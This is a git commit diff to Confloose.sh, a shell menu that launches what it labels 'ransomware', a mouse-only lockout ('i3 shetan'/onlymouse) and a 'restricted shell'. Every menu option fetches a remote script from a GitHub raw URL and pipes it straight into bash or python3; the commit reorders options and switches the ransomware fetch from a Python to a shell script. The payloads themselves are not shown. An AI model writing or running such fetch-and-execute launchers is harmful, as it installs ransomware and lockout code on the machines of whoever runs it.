ad6ea3144719a8f26ebf42346fae304c75946bdf
Nekro <70316327+NeKroFR@users.noreply.github.com>
2023-12-12 16:33:06 +0100

    Update Confloose.sh

--- Confloose.sh
+++ Confloose.sh
@@ -7,8 +7,8 @@ function gui() {
     echo "$banner"
     echo "-------"
     echo -e "\033[0;31m[0]\033[0m ransomware"
-    echo -e "\033[0;31m[1]\033[0m restricted shell"
-    echo -e "\033[0;31m[2]\033[0m disable keyboard"
+    echo -e "\033[0;31m[1]\033[0m i3 shetan"
+    echo -e "\033[0;31m[2]\033[0m restricted shell"
     echo -e "\033[0;31m[3]\033[0m exit"
 
     echo "-------"
@@ -19,13 +19,13 @@ function gui() {
 function confloose() {
     if [ "$1" == "0" ] || [ "$1" == "ransom" ] || [ "$1" == "-r" ]; then
         # ransomware
-        python3 <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/ransom.py")
+        bash <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/ransom.sh")
     elif [ "$1" == "1" ] || [ "$1" == "shell" ] || [ "$1" == "-s" ]; then
+         # i3 shetan
+         bash <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/onlymouse.sh")
+    elif [ "$1" == "2" ] || [ "$1" == "shell" ] || [ "$1" == "-s" ]; then
         # restricted_shell
         python3 <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/restricted_shell.py")
-    elif [ "$1" == "2" ] || [ "$1" == "shell" ] || [ "$1" == "-s" ]; then
-         # onlymouse
-         bash <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/onlymouse.sh")
     elif [ "$1" == "3" ]; then
         exit
     else
